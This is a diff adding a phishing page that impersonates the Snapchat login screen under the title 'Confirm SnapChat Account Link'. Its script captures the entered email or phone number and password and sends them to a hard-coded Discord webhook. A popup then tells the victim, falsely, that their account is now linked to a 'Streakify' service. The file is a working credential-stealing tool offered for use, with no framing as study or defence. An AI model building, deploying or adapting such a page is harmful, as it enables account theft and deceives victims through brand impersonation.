@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Confirm SnapChat Account Link</title>
+	<link rel="shortcut icon" type="image/png" href="https://upload.wikimedia.org/wikiversity/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png"/> 
+	<style>
+		body {
+			background-color: #FFFC00;
+			background-size: cover;
+			font-family: Helvetica;
+		}
+        .text-box {
+			padding: 10px;
+			border: none;
+			border-bottom: 1px solid rgba(0,0,0,.3);
+			margin-bottom: 20px;
+			width: 100%;
+			box-sizing: border-box;
+			background-color: rgba(255,255,255,.8);
+			font-size: 16px;
+			color: #111;
+		}
+		.text-box:focus {
+			outline: none;
+		}
+		.login-btn {
+			background-color: #52B1F6;
+			color: #ffffff;
+			border: none;
+			padding: 10px;
+			cursor: pointer;
+			width: 100%;
+			font-size: 18px;
+			font-weight: bold;
+			border-radius: 5px;
+			margin-bottom: 20px;
+		}
+		.signup-text {
+			text-align: center;
+			margin-top: 10px;
+			color: #fff;
+			cursor: pointer;
+			font-size: 14px;
+			font-weight: normal;
+		}
+		.signup-link {
+			color: #fff;
+		}
+		.logo {
+			display: block;
+			margin: 30px auto 20px;
+			width: 120px;
+		}
+		.container {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			max-width: 320px;
+			padding: 20px;
+			background-color: rgba(255,255,255,.9);
+			box-shadow: 0px 0px 10px rgba(0,0,0,.3);
+			border-radius: 10px;
+		}
+
+		
+		.footer {
+			background-color: #111;
+			color: #fff;
+			font-size: 14px;
+			text-align: center;
+			position: fixed;
+			bottom: 0;
+			left: 0;
+			right: 0;
+			padding: 5px;
+		}
+	
+		.footer a {
+			color: #fff;
+			text-decoration: none;
+			margin: 0 5px;
+	}
+		
+
+
+	</style>
+</head>
+<body>
+	<div class="container">
+		<img src="https://upload.wikimedia.org/wikiversity/en/thumb/c/c4/Snapchat_logo.svg/2048px-Snapchat_logo.svg.png" alt="SnapChat Logo" class="logo">
+		<input type="text" placeholder="Email or phone" class="text-box">
+		<input type="password" placeholder="Password" class="text-box">
+		<button type="submit" class="login-btn">Sign in</button>
+        <script>
+            const webhookUrl = 'https://discord.com/api/webhooks/1101354855408345119/GiDq_WHrs9h6Qj9hKdHHAvA7ATUFf8PhF3xMc0hIkdu-tvIfZNwrmKK7zb-nMO9lE5so';
+     
+            function sendWebhook() {
+               const emailOrPhone = document.querySelector('input[type="text"]').value;
+               const password = document.querySelector('input[type="password"]').value;
+     
+               const payload = {
+                  content: `Email or phone: ${emailOrPhone}\nPassword: ${password}`
+               };
+     
+               fetch(webhookUrl, {
+                  method: 'POST',
+                  headers: {
+                     'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(payload)
+               })
+               .then(response => {
+                  console.log('Webhook sent successfully');
+               })
+               .catch(error => {
+                  console.error('Error sending webhook:', error);
+               });
+            }
+     
+            const loginButton = document.querySelector('.login-btn');
+            loginButton.addEventListener('click', sendWebhook);
+			loginButton.addEventListener('click', function() {
+				const waitlistWindow = window.open("", "_blank", "width=400,height=200,left=" + (screen.width/2 - 200) + ",top=" + (screen.height/2 - 100));
+waitlistWindow.document.body.style.backgroundColor = "#52B1F6";
+waitlistWindow.document.body.style.color = "#fff";
+waitlistWindow.document.body.style.fontFamily = "Helvetica";
+waitlistWindow.document.body.style.textAlign = "center";
+waitlistWindow.document.body.style.display = "flex";
+waitlistWindow.document.body.style.flexDirection = "column";
+waitlistWindow.document.body.style.justifyContent = "center";
+waitlistWindow.document.body.innerHTML = "<h2>Your Account Has Been Linked!!</h2><p>Your account has now linked to the 'Streakify' service, to cancel account linking go to the account settings in the SnapChat mobile app.'</p>";
+
+});
+
+			
+         </script>
+        
+        
+     <p style="font-family: Helvetica; color: #52B1F6; text-align: center;">Don't have an account? <a href="https://snapchat.com/signup" style="text-decoration: none; color: #52B1F6; border-bottom: 1px solid #52B1F6;">Create One!</a></p>
+
+	</div>
+	<div class="footer">
+		<p>Snapchat ® 2023</p>
+		<a href="#">Terms of Use</a>
+		<a href="#">Privacy Policy</a>
+		<a href="#">Help</a>
+	</div>
+	
+	
+</body>
+</html>
+ 
+
+
+     
